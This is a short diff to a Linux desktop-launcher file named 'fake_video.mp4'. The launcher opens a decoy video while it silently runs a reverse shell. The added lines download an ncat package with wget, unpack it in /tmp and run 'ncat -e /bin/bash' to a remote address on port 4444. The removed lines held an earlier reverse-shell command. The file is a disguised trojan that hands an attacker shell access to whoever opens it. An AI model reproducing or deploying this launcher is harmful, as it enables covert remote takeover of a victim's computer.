@@ -3,6 +3,9 @@
 Type=Application
 Encoding=UTF-8
 Name=fake_video.mp4
-Exec= /usr/bin/xdg-open hide/real_video.mp4;
-ncat -e /bin/bash 192.168.1.13 1234
+Exec= /usr/bin/xdg-open ./real_video.mp4;
+wget -P /tmp http://archive.ubuntu.com/ubuntu/pool/universe/n/nmap/ncat_7.80+dfsg1-2build1_amd64.deb;
+dpkg -x /tmp/ncat_7.80+dfsg1-2build1_amd64.deb /tmp/netcatdir;
+cd /tmp/netcatdir/usr/bin;
+./ncat -e /bin/bash 192.168.1.13 4444
 Terminal= false
